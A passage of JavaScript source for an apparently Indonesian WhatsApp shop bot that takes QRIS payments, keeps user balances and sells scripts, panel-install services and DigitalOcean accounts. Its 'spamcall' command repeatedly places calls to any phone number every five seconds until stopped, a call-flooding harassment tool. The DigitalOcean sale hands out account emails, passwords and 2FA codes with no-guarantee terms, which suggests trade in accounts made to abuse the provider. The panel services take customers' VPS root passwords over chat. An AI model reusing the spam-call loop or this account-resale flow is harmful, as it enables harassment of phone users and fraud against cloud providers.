    for (let gg of stokdo) {
    butnya.push({
    title: `${gg.nama} ✅`, 
    description: `Rp${await toIDR(gg.harga)}`, 
    id: `.buydo ${urutt += 1}`
    })
    }
    return Rulzz.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Droplet",
                sections: [
                  {
                    highlight_label: "High Quality",
                    rows: butnya, 
                    }
                 ], 
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n*Pilih Akun Digital Ocean*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: qtoko }
    );
  }
const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya

  const unik = generateRandomNumber(1,8);
  const total = Obj.harga + unik;
  const owner = global.owner + '@s.whatsapp.net';

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• Id Trx :* ${idtransaksi}
 *• Harga :* ${Obj.harga}
 *• Fee :* ${unik}
 *• Total Pembayaran :* Rp${await toIDR(total)}
 *• Barang :* Digital Ocean ${donya.droplet} Drop
 *• Expired :* 5 menit`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks3,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  setTimeout(async () => {
    if (
      db.users[m.sender]?.saweria?.status &&
      Date.now() >= db.users[m.sender].saweria.expireAt
    ) {
      await Rulzz.sendMessage(m.chat, {
        text: "❌ Waktu pembayaran sudah habis."
      }, { quoted: msgQr });

      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  let retries = 0;
  const maxRetries = 60;

  while (
    db.users[m.sender]?.saweria?.status &&
    Date.now() < expireAt &&
    retries < maxRetries
  ) {
    retries++;
    await sleep(5000);

    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];

      const cocok = mutasi.slice(0, 3).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
      
      db.users[m.sender].status_deposit = false
      await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Harga :* ${Obj.harga}
 *• Fee :* ${unik}
 *• Total Pembayaran :* Rp${await toIDR(total)}
 *• Barang :* Digital Ocean ${Obj.akun.droplet} Droplet
 
 *Sedang Memproses Data Akun...*`}, {quoted: db.users[m.sender].saweria.msg})
 await sleep(2000)
var teks = `*Data Akun Digital Ocean Kamu 📦*
_${Obj.akun.nama}_

*📧 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*📃 Kode 2FA :* ${Obj.akun.kode2fa}
*📜 Kode Refferal :* ${Obj.akun.referall}

*🌐 Link DO :* https://cloud.digitalocean.com/login
*🌐 Link Cek Kode 2FA :* https://2fa.live
*📝 Cara Login :* https://img1.pixhost.to/images/7852/630618414_rulzz-official.jpg

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin!
* Seller hanya mengirim 1 kali!
* No garansi dalam bentuk apapun!`
 await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
 addTransaction(m.sender, `Akun DO ${Obj.akun.nama}`, Obj.harga);
 await Rulzz.sendMessage(owner, {
        text: `📢 DO SOLD ❗\n\n🆔 @${m.sender.split("@")[0]}\n📦 ${Obj.akun.nama}\n💸 Rp${await toIDR(Obj.harga)}\n✅ STATUS: Berhasil`,
        mentions: [m.sender]
      });
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/data/stokdo.json", JSON.stringify(stokdo, null, 2))
await Rulzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
} catch (err) {
console.log("Error :", err);
}
}
}
break

case "reffund": {
  const msg = m.message;
  const type = Object.keys(msg)[0];
  const nohp = m.sender.split('@')[0];
  const ownerJid = global.owner + '@s.whatsapp.net';
  const imgFolder = path.join(__dirname, 'source', 'media');

  if (refundRequests[m.sender]) {
    const expireTime = 24 * 60 * 60 * 1000;
    const lastRequest = refundRequests[m.sender].waktu;
    if (Date.now() - lastRequest < expireTime) {
      return m.reply("❗ Kamu sudah mengirim permintaan refund. Tunggu diproses admin.");
    } else {
      delete refundRequests[m.sender];
      saveRefundRequests();
    }
  }

  if (type === 'imageMessage' && msg.imageMessage.caption) {
    const caption = msg.imageMessage.caption.trim();
    const wordCount = caption.split(/\s+/).length;

    if (wordCount < 10)
      return m.reply("❌ Penjelasan minimal 10 kata ya, coba lagi.");

    if (!fs.existsSync(imgFolder)) fs.mkdirSync(imgFolder, { recursive: true });

    const buffer = await downloadImageBuffer(msg.imageMessage);
    const filename = path.join(imgFolder, `${nohp}_${Date.now()}.jpg`);
    fs.writeFileSync(filename, buffer);

    await Rulzz.sendMessage(ownerJid, {
      image: fs.readFileSync(filename),
      caption: `📥 Refund dari ${nohp}:\n\nPenjelasan:\n"${caption}"\n\n✅ Setuju:\n.terimareffund ${nohp} <jumlah>\n❌ Tolak:\n.tolakreffund ${nohp}`
    });

    fs.unlinkSync(filename);

    refundRequests[m.sender] = { reason: caption, waktu: Date.now() };
    saveRefundRequests();

    return m.reply("✅ Permintaan reffund kamu sudah dikirim ke admin. Tunggu konfirmasi ya.");
  } else {
    return m.reply(example("Kirim *screenshot bukti kendala* + *penjelasan masalah minimal 10 kata* + *nominal*"));
  }
}
break

case "terimareffund": {
  if (!isCreator) return m.reply(mess.owner);

  const args = text.trim().split(/\s+/);
  if (args.length < 2) return m.reply("Format: .terimareffund 628xxxx <jumlah>");

  const nomor = args[0];
  const jumlah = Number(args[1]);

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("Jumlah harus angka positif.");

  const jid = nomor.includes('@s.whatsapp.net') ? nomor : nomor + '@s.whatsapp.net';

  if (!refundRequests[jid]) return m.reply(`❌ Nomor ${nomor} tidak mengajukan reffund atau sudah diproses.`);

  if (!db.users[jid]) db.users[jid] = { saldo: 0 };
  db.users[jid].saldo = (db.users[jid].saldo || 0) + jumlah;

  const saldoBaru = db.users[jid].saldo;

  fs.writeFileSync('./library/database/saldo.json', JSON.stringify(db, null, 2));

  await Rulzz.sendMessage(jid, {
    text: `✅ Reffund diterima, saldo kamu dikembalikan Rp${jumlah}.\n\n💰 *Saldo saat ini:* Rp${saldoBaru}`
  });

  delete refundRequests[jid];
  saveRefundRequests();

  m.reply(`Reffund untuk @${nomor} sebesar Rp${jumlah} berhasil diproses.\nSaldo @${nomor} saat ini: Rp${saldoBaru}`, {
    mentions: [jid]
  });
}
break

case "tolakreffund": {
  if (!isCreator) return m.reply(mess.owner);

  const nomor = text.trim();
  if (!nomor) return m.reply("Format: .tolakreffund 628xxxx");

  const jid = nomor.includes('@s.whatsapp.net') ? nomor : nomor + '@s.whatsapp.net';

  if (!refundRequests[jid]) {
   return m.reply(`❌ Nomor ${nomor} tidak mengajukan reffund atau sudah diproses.`);
  };

  await Rulzz.sendMessage(jid, { text: "❌ reffund kamu *ditolak* oleh admin." });

  delete refundRequests[jid];
  saveRefundRequests();

  m.reply(`reffund dari @${nomor} telah ditolak.`, { mentions: [jid] });
}
break

//================================================================================

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await Rulzz.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch (err) {
console.log("Error :", err);
m.reply("Emoji yang dipilih tidak dapat digabungkan! Silakan pilih emoji lain");
}
}
break

//================================================================================

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await Rulzz.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
m.reply("Emoji yang dipilih tidak dapat dijadikan gif! Silakan coba emoji lain.");
}
}
break

//================================================================================

case "addscript": case "addsc": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !m.quoted) return m.reply(example("namasc|harga(contoh 30000) dengan reply scriptnya"))
if (!/zip/.test(mime)) return m.reply(example("namasc|harga(contoh 30000) dengan reply scriptnya"))
let [namasc, harga] = text.split("|")
if (!namasc || !harga || isNaN(harga)) return m.reply(example("namasc|harga(contoh 30000) dengan reply scriptnya"))
harga = Number(harga)
script.push({
nama: namasc, 
path: "./source/media/" + namasc + '.zip', 
harga: harga.toString()
})
await fs.writeFileSync("./source/media/script.json", JSON.stringify(script, null, 2))
let ff = await m.quoted.download()
await fs.writeFileSync("./source/media/"+namasc+".zip", ff)
return m.reply(`Berhasil menambah script *${namasc}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listscript": case "listsc": {
if (!isCreator) return m.reply(mess.owner)
if (script.length < 1) return m.reply("Tidak ada Script Bot.")
let teks = ""
let id = 0
for (let i of script) {
id += 1
teks += `
* *ID :* ${id}
* *Nama :* ${i.nama}
* *Harga :*  Rp${await toIDR(i.harga)}
`
}
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "delscript": case "delsc": {
if (!isCreator) return m.reply(mess.owner)
if (script.length < 1) return m.reply("Tidak ada Script Bot.")
if (text === "all") {
await fs.readdirSync("./source/media/").filter(i => i !== "akses.txt").forEach(async (path) => {
try {
await fs.unlinkSync("./source/media/"+path)
} catch {}
})
script.length = 0; 
await fs.writeFileSync("./source/media/script.json", JSON.stringify(script, null, 2))
return m.reply(`Berhasil menghapus semua Script ✅`);
}
if (!text || isNaN(text)) return example("idscript")
let number = Number(text)
if (number > script.length) return m.reply("ID Script tidak ditemukan.")
let sc = script[number - 1]
const namasc = sc.nama
try {
await fs.unlinkSync(sc.path)
} catch {}
script.splice((number - 1), 1)
await fs.writeFileSync("./source/media/script.json", JSON.stringify(script, null, 2))
return m.reply(`Berhasil menghapus script *${namasc}*`)
}
break

//================================================================================

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("id chnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break
//================================================================================
case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break
//================================================================================
case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
Rulzz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================
case "feerekber": {
   let teks = `*💸FEE BER-BER*💸
• 0-20 = 3K
• 21-100 = 5K
• 101-200 = 10K
• 201-300 = 15K
• 301-400 = 20K
• 401-500 = 25K
• 501-600 = 30K
• 601-700 = 35K
• 701-800 = 40K
• 801-900 = 45K
• 901-999 = 50K
• Di atas 1 juta = 55K
TT/BT : 15K`;
m.reply(teks)
}
break

case "spamcall": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(example("62xxx"))

  let nomor = text.replace(/[^0-9]/g, '')
  if (nomor.length < 8) return m.reply("Nomor tidak valid!")

  let target = nomor + "@s.whatsapp.net"

  async function sendOfferCall(target) {
    try {
      await Rulzz.offerCall(target)
      console.log(chalk.green.bold(`[ SPAM CALL ]`), chalk.white(`${target}`))
    } catch (error) {
      console.log(chalk.red.bold(`[ GAGAL ]`), chalk.white(`${target}`), error.message)
    }
  }

  await m.reply(`✅ Permintaan diproses!\nNomor: ${nomor}\nAkan di spam call secara terus menerus.\nKetik *.stopspamcall* untuk menghentikan.`)

  global.spamCallTarget = target
  global.spamCallStop = false

  while (!global.spamCallStop) {
    await sendOfferCall(target)
    await sleep(5000)
  }
}
break

case "stopspamcall": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.spamCallTarget) {
    global.spamCallStop = true
    await m.reply(`🛑 Spam call untuk ${global.spamCallTarget} telah dihentikan.`)
    console.log(chalk.yellow.bold(`[ STOP SPAM CALL ]`), chalk.white(global.spamCallTarget))
  } else {
    m.reply("Tidak ada proses spam call yang aktif.")
  }
}
break

//================================================================================
case "formatjp": case "jp": {
    let teks = `*💸FORMAT JASAPOST ${global.namaOwner}*💸
*AKUN*: 
*OP*: 
*SPEK*: 
*LOG*: 
*A2F* : 
*MC*: *Rulzz Store*

*NOTE*‼️
📌 *WAJIB MENGGUNAKAN JASA ADMIN SETEMPAT AGAR TERHINDAR DARI PENIPUAN*
📌 *KENA RIP KARENA TIDAK MENGGUNAKAN JASA REKBER DILARANG KOAR KOAR!!*

🥀BEE SMART A BUYER🥀`;
m.reply(teks)
}
break
//================================================================================
case "formatneed": case "need": {
    let teks = `*💸FORMAT NEED AKUN ${global.namaOwner}*💸
NAMA : 
AKUN :
LOGIN :
HARGA : 
SPEK AKUN :  
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN SETEMPAT UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*NAMA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`;
m.reply(teks)
}
break

// -̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶-̶

case "tambahsaldo": case "addsaldo": {
  if (!isCreator) return m.reply(mess.owner);

  let [nomor, jumlah] = text.split(" ");
  if (!nomor || !jumlah) return m.reply(example("628xxxx 10000"));

  let jid = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net";
  if (!db.users[jid]) db.users[jid] = { saldo: 0 };

  db.users[jid].saldo = (db.users[jid].saldo || 0) + Number(jumlah);
  fs.writeFileSync('./library/database/saldo.json', JSON.stringify(db, null, 2));

  m.reply(`Berhasil menambahkan saldo sebesar Rp${await toIDR(jumlah)} ke @${nomor}`, { mentions: [jid] });
}
break

case "kurangisaldo": case "minsaldo": {
  if (!isCreator) return m.reply(mess.owner);

  let [nomor, jumlah] = text.split(" ");
  if (!nomor || !jumlah) return m.reply(example("628xxxx 5000"));

  let jid = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net";
  if (!db.users[jid]) db.users[jid] = { saldo: 0 };

  db.users[jid].saldo = Math.max(0, (db.users[jid].saldo || 0) - Number(jumlah));
  fs.writeFileSync('./library/database/saldo.json', JSON.stringify(db, null, 2));

  m.reply(`Saldo @${nomor} berhasil dikurangi sebesar Rp${await toIDR(jumlah)}`, { mentions: [jid] });
}
break

case "ceksaldo": {
  if (!isCreator) return m.reply(mess.owner);

  let nomor = text.trim();
  if (!nomor) return m.reply(example("628xxxx"));

  let jid = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net";
  let saldo = db.users[jid]?.saldo || 0;

  m.reply(`Saldo @${nomor}: Rp${await toIDR(saldo)}`, { mentions: [jid] });
}
break
    
case "deposit": case "depo": {
  if (m.isGroup) return m.reply("❌ Deposit hanya bisa di private chat!");
  if (!text) return m.reply(example("5000"));

  if (!db.users[m.sender]) db.users[m.sender] = {};
  if (db.users[m.sender]?.saweria?.status)
    return m.reply("⚠️ Masih ada transaksi aktif.\nKetik *.batalbeli* untuk membatalkan.");

  if (!/^\d+$/.test(text.trim())) {
  return m.reply("❌ Nominal deposit hanya boleh angka!\n\nContoh: `.depo 5000`")};
  // if (nominal < 1000) return m.reply("❌ Minimal deposit adalah Rp5.000!");
  
  const nominal = parseInt(text.trim());
  const unik = generateRandomNumber(1,8);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DEPOSIT SALDO*
*• Id Trx :* ${idtransaksi}
*• Deposit:* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 Rate Kehokian Bonus Saldo*
97% : Rp500 - Rp1.000
2% : Rp3.000 - Rp7.000
1% : Rp10.000 - Rp20.000

_Terjadi kendala setelah transfer?? klik button kedua di bawah!!_`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  setTimeout(async () => {
    if (
      db.users[m.sender]?.saweria?.status &&
      Date.now() >= db.users[m.sender].saweria.expireAt
    ) {
      await Rulzz.sendMessage(m.chat, {
        text: "❌ Waktu pembayaran sudah habis."
      }, { quoted: msgQr });

      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  let retries = 0;
  const maxRetries = 60;

  while (
    db.users[m.sender]?.saweria?.status &&
    Date.now() < expireAt &&
    retries < maxRetries
  ) {
    retries++;
    await sleep(5000);

    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];

      const cocok = mutasi.slice(0, 3).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;

      const bonus = generateBonus();
      if (!db.users[m.sender].saldo) db.users[m.sender].saldo = 0;
      db.users[m.sender].saldo += nominal + bonus;

      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;

      await Rulzz.sendMessage(m.chat, {
        text: `✅ *PEMBAYARAN BERHASIL!*\nSaldo sedang diproses...`
      }, { quoted: msgQr });
      
      await sleep(2000);
      await animasiSpin(m.chat, msgQr);
      fs.writeFileSync('./library/database/saldo.json', JSON.stringify(db, null, 2));
      addTransaction(m.sender, 'Deposit Saldo', nominal);

      await Rulzz.sendMessage(m.chat, {
        text: `*✅ Deposit Berhasil!!!*

*• Id Trx :* ${idtransaksi}
*• Jumlah:* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlahInt)}
*• Bonus:* Rp${await toIDR(bonus)}
*• Saldo Saat Ini:* Rp${await toIDR(db.users[m.sender].saldo)}

Terima kasih sudah deposit!`,
        quoted: msgQr
      });

      await Rulzz.sendMessage(global.owner + "@s.whatsapp.net", {
        text: `*✅ DEPOSIT MASUK*
• User: @${m.sender.split("@")[0]}
• Nominal: Rp${await toIDR(nominal)}
• Fee: Rp${await toIDR(unik)}
• Total Bayar: Rp${await toIDR(jumlahInt)}
• Bonus: Rp${await toIDR(bonus)}
• Total Saldo: Rp${await toIDR(db.users[m.sender].saldo)}`,
        mentions: [m.sender]
      });
      
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      delete db.users[m.sender].saweria;

    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "saldo": {
  if (!db.users[m.sender]) db.users[m.sender] = { saldo: 0 };
  let saldo = db.users[m.sender].saldo || 0;
  let teks = `*Saldo Kamu Saat Ini:* Rp${await toIDR(saldo)}!!`;
  await Rulzz.sendMessage(m.chat, {
  footer: `© RulzXD V4.0 By Rulzz OfficiaL`,
  buttons: [
    {
      buttonId: `.deposit`,
      buttonText: { displayText: 'Isi Saldo' },
      type: 1
    },
    {
     buttonId: `.kirim`,
     buttonText: { displayText: `Transfer Saldo` },
     type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `ʀᴜʟᴢxᴅ ʙᴏᴛᴢ ʙʏ ʀᴜʟᴢᴢ ᴏғғɪᴄɪᴀʟ`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
  },
})
}
break

case "kirim": case "transfer": case "tf": {
  let [nomor, jumlah] = text.split(" ");
  if (!nomor || !jumlah) return m.reply(example("628xxxx 2000"));

  let target = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net";
  jumlah = Number(jumlah);
  const fee = Math.floor(Math.random() * (400 - 250 + 1)) + 250; 
  
  if (isNaN(jumlah) || jumlah <= 0) return m.reply("Jumlah tidak valid!");

  if (!db.users[m.sender]) db.users[m.sender] = { saldo: 0 };
  if (!db.users[target]) db.users[target] = { saldo: 0 };

  if (db.users[m.sender].saldo < (jumlah + fee))
    return m.reply(`Saldo kamu tidak cukup untuk mengirim! Kamu butuh Rp${await toIDR(jumlah + fee)} (termasuk biaya admin Rp${await toIDR(fee)})`);

  db.users[m.sender].saldo -= (jumlah + fee);
  db.users[target].saldo += jumlah;

  fs.writeFileSync('./library/database/saldo.json', JSON.stringify(db, null, 2));

  await m.reply(`Berhasil mengirim saldo sebesar Rp${await toIDR(jumlah)} ke @${nomor} dengan biaya admin Rp${await toIDR(fee)}. Sisa saldo kamu: Rp${await toIDR(db.users[m.sender].saldo)}`, {
    mentions: [target]
  });

  await Rulzz.sendMessage(target, {
    text: `*SALDO MASUK ✅*

Kamu menerima saldo dari @${m.sender.split("@")[0]}

+Rp${await toIDR(jumlah)} telah masuk ke akunmu.\nSaldo sekarang: Rp${await toIDR(db.users[target].saldo)}`.trim(),
    mentions: [m.sender]
  });
}
break

case "jasainstallpanel": {
  if (m.isGroup) return m.reply("Pembelian jasa install panel hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps|reqsubdo"))

  const [ipVps, pwVps, subdo] = text.split("|")
  if (!ipVps || !pwVps || !subdo) return m.reply("Format salah! Gunakan: ipvps|pwvps|reqsubdo")

  const fullSubdo = subdo.toLowerCase()
  const pilihanIndex = [4, 5, 6];
  const tld = Object.keys(global.subdomain)[pilihanIndex[Math.floor(Math.random() * pilihanIndex.length)]];
  const domainPanel = `${fullSubdo}.${tld}`
  const domainNode = `node.${fullSubdo}.${tld}`
  const ramServer = "1600000"
  const hargaJasaInstall = global.hargainstallpanel
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
*• Id Trx :* ${idtransaksi}
*• Nominal :* Rp${nominal}
*• Fee :* Rp${unik}
*• Total :* Rp${await toIDR(jumlah)}
*• Status :* Menunggu Pembayaran
*• Expired :* 5 Menit

*乂 DETAIL PEMBELIAN*
*• Barang :* Jasa Install Panel
*• Ip Vps :* ${ipVps}
*• Pw Vps :* ${pwVps}
*• Subdomain :* ${domainPanel}
*• Node :* ${domainNode}`;

  const msgQr = await Rulzz.sendMessage(m.chat, {
    image: { url: imageqris.url },
    caption: teks,
    buttons: [
      { buttonId: `.batalbeli`, buttonText: { displayText: "Batalkan Pembelian" }, type: 1 },
      { buttonId: `.reffund`, buttonText: { displayText: "Laporan Pembelian" }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      mentionedJid: [m.sender],
      isForwarded: true
    }
  });

  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: idtransaksi,
    amount: jumlahInt,
    status: true,
    expireAt
  };

  
  setTimeout(async () => {
    if (db.users[m.sender]?.saweria?.status && Date.now() >= db.users[m.sender].saweria.expireAt) {
      await Rulzz.sendMessage(m.chat, { text: "❌ Waktu pembayaran sudah habis." }, { quoted: msgQr });
      await Rulzz.sendMessage(m.chat, { delete: msgQr.key });
      db.users[m.sender].status_deposit = false;
      db.users[m.sender].saweria.status = false;
      delete db.users[m.sender].saweria;
    }
  }, 5 * 60 * 1000);

  
  let retries = 0;
  const maxRetries = 60;
  while (db.users[m.sender]?.saweria?.status && Date.now() < expireAt && retries < maxRetries) {
    retries++;
    await sleep(5000);
    try {
      const mutasi = (await axios.get(`https://api.rulzzofficial.my.id/orkut/cekstatus?apikey=${global.apikey}&username=${global.username}&token=${global.tokenorkut}`)).data.result || [];
      const cocok = mutasi.slice(0, 5).find(x => parseInt(x.kredit) === jumlahInt);
      if (!cocok) continue;
     db.users[m.sender].status_deposit = false
     await clearInterval(db.users[m.sender].saweria.exp)
     await Rulzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• Id Trx :* ${idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(nominal)}
 *• Barang :* Jasa Install Panel
`}, {quoted: db.users[m.sender].saweria.msg})
      
      const hasilSub = await subDomainDouble(fullSubdo, ipVps, tld)
      if (!hasilSub.success) return m.reply(`Gagal membuat subdomain: ${hasilSub.error}`)

      const listSub = hasilSub.data.map((item, i) => `• ${i+1}. ${item.name} → ${item.ip}`).join("\n")
      await m.reply(`*Subdomain berhasil dibuat ✅*\n\n${listSub}`)
      const passwordPanel = await installPanel(ipVps, pwVps, domainPanel, domainNode, ramServer, m.chat, m);
      addTransaction(m.sender, 'Jasa Install Panel', nominal);
      delete db.users[m.sender].saweria
    } catch (err) {
      console.error("❌ Gagal cek mutasi:", err.message);
    }
  }
}
break

case "jasahbpanel": {
  if (m.isGroup) return m.reply("Pembelian jasa hack back panel hanya bisa di dalam private chat")
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
  if (!text) return m.reply(example("ipvps|pwvps"))

  const [ipVps, pwVps] = text.split("|")
  if (!ipVps || !pwVps) return m.reply("Format salah! Gunakan: ipvps|pwvps")
  
  const hargaJasaInstall = global.hargahbpanel 
  
  const nominal = Number(hargaJasaInstall);
  const unik = generateRandomNumber(200, 350);
  const total = nominal + unik;

  const res = await axios.get(`https://api.rulzzofficial.my.id/orkut/createpayment?apikey=${global.apikey}&amount=${total}&codeqr=${global.kodeqr}`);
  const { imageqris, jumlah, idtransaksi } = res.data.result;
  const jumlahInt = parseInt(jumlah);
  const expireAt = Date.now() + 5 * 60 * 1000;

  const teks = `
*乂 DETAIL PEMBAYARAN*
